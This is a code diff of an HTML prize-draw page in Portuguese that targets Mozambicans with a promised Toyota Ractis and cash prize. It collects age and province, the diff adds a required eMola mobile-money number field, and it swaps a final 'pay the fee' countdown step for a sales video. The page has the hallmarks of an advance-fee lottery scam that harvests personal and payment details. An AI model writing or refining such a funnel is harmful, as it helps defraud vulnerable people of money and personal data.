@@ -83,7 +83,7 @@
         <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p3"></div></div>
         <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c4">4</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Dados</div></div>
         <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p4"></div></div>
-        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c5">5</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Concluir</div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c5">5</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">VSL</div></div>
       </div>
       <div class="mt-4 text-center"><span class="font-bold" id="step-label">Etapa 1 de 5</span><span class="ml-2 text-xs opacity-60 uppercase tracking-wider" id="step-sub">Preencha seus dados para continuar</span></div>
     </div>
@@ -226,6 +226,7 @@
         <form id="f4" class="space-y-4" onsubmit="return nextStep(4)">
           <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-calendar h-4 w-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg></span> Idade</label><input type="number" id="idade" placeholder="Sua idade" min="18" required class="input w-full"/></div>
           <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-map-pin h-4 w-4"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg></span> Província</label><select id="provincia" required class="input w-full"><option value="" selected disabled>Selecione uma província</option><option>Maputo</option><option>Matola</option><option>Gaza</option><option>Inhambane</option><option>Sofala</option><option>Manica</option><option>Tete</option><option>Zambézia</option><option>Nampula</option><option>Cabo Delgado</option><option>Niassa</option></select></div>
+          <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone h-4 w-4" aria-hidden="true"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"></path></svg></span> Número da eMola</label><input type="tel" id="emola-number" placeholder="Ex: 84 123 4567" required class="input w-full"/></div>
           <div class="flex justify-between">
             <button type="button" onclick="prevStep(4)" class="h-14 rounded-lg font-bold text-navy-deep transition bg-white border border-black/10 hover:bg-black/5">Voltar</button>
             <button type="submit" class="h-14 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md">Próximo &rarr;</button>
@@ -234,19 +235,17 @@
       </div>
     </section>
 
-    <!-- STEP 4: Concluir -->
-    <section id="s4" class="hidden fade-in">
+    <!-- STEP 5: VSL (vídeo) -->
+    <section id="s5" class="hidden fade-in">
       <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7 text-center">
-        <div class="w-16 h-16 rounded-full bg-gold text-navy-deep flex items-center justify-center mx-auto mb-4 text-2xl font-bold">&#10003;</div>
-        <h2 class="text-2xl md:text-3xl font-extrabold mb-3">Cadastro concluído!</h2>
-        <p class="text-navy-deep/70 mb-6">Seus dados foram enviados com sucesso. Boa sorte no sorteio do Toyota Ractis + 25.000 MT.</p>
+        <div class="w-16 h-16 rounded-full bg-gold text-navy-deep flex items-center justify-center mx-auto mb-4 text-2xl font-bold">📺</div>
+        <h2 class="text-2xl md:text-3xl font-extrabold mb-3">Assista ao VSL</h2>
+        <p class="text-navy-deep/70 mb-6">Assista ao vídeo oficial para receber seu prêmio de 19.000 meticais.</p>
         <div class="rounded-2xl shadow-xl overflow-hidden border border-black/5 bg-black aspect-video max-w-[560px] mx-auto">
           <vturb-smartplayer id="vid-6aee16b3526a2ed90e962398" style="display: block; width: 100%; height: 100%;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 55.625% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
         </div>
         <script>var s=document.createElement("script");s.src="https://scripts.converteai.net/e984ae4f-723b-4a7e-8098-ad701a5746ff/players/6aee16b3526a2ed90e962398/v4/player.js";s.async=!0;document.head.appendChild(s);</script>
         <p class="text-[10px] uppercase tracking-wider text-navy-deep/60 mt-4">Assista ao sorteio oficial Tele Prêmio × TV Sucesso.</p>
-        <p id="taxa-contador" class="text-sm font-bold text-navy-deep mt-4 hidden">Pagar a taxa disponível em <span id="taxa-tempo">2:42</span></p>
-        <button id="btn-taxa" disabled class="mt-6 inline-block px-8 py-3 rounded-lg font-bold text-white transition bg-gray-400 cursor-not-allowed shadow-md hidden">Pagar a taxa &rarr;</button>
       </div>
     </section>
 
@@ -272,9 +271,9 @@
   </footer>
 
   <script>
-    const steps = ['s1','s2','s3','s4'];
-    const circles = ['c1','c2','c3','c4'];
-    const progress = ['p1','p2','p3'];
+    const steps = ['s1','s2','s3','s4','s5'];
+    const circles = ['c1','c2','c3','c4','c5'];
+    const progress = ['p1','p2','p3','p4'];
     let current = 1;
 
     function showStep(n) {
@@ -284,18 +283,18 @@
         c.className = 'step-circle ' + (i + 1 < n ? 'step-done' : (i + 1 === n ? 'step-active' : 'step-pending'));
       });
       progress.forEach((id, i) => { document.getElementById(id).style.width = (i < n - 1 ? '100%' : '0%'); });
-      document.getElementById('step-label').textContent = 'Etapa ' + n + ' de 4';
-      document.getElementById('step-sub').textContent = n===1?'Preencha seus dados para continuar':(n===2?'Acompanhe o sorteio ao vivo':(n===3?'Confirme seus dados para receber o prêmio':'Assista ao sorteio e pague a taxa'));
+      document.getElementById('step-label').textContent = 'Etapa ' + n + ' de 5';
+      document.getElementById('step-sub').textContent = n===1?'Preencha seus dados para continuar':(n===2?'Acompanhe o sorteio ao vivo':(n===3?'Confirme seus dados para receber o prêmio':(n===4?'Assista ao VSL':'Assista ao vídeo final')));
       window.scrollTo({ top: 0, behavior: 'smooth' });
       current = n;
     }
 
     function nextStep(step) {
-      if (step === 1 || step === 3) {
+      if (step === 1 || step === 3 || step === 4) {
         const form = document.getElementById('f' + step);
         if (!form.checkValidity()) { form.reportValidity(); return false; }
       }
-      if (step < 4) showStep(step + 1);
+      if (step < 5) showStep(step + 1);
       return false;
     }
 
@@ -333,16 +332,7 @@
     showStep = function (n) {
       _showStep(n);
       if (n === 5) {
-        taxaRestante = TAXA_SEGUNDOS;
-        contadorTaxa.classList.remove('hidden');
-        btnTaxa.classList.add('hidden');
-        btnTaxa.disabled = true;
-        btnTaxa.classList.replace('bg-navy-deep', 'bg-gray-400');
-        btnTaxa.classList.remove('hover:bg-[#0a0c1c]');
-        btnTaxa.classList.add('cursor-not-allowed');
-        clearInterval(window.taxaInterval);
-        atualizarContadorTaxa();
-        window.taxaInterval = setInterval(atualizarContadorTaxa, 1000);
+        // Etapa 5 é VSL, não há contador de taxa
       } else {
         clearInterval(window.taxaInterval);
       }
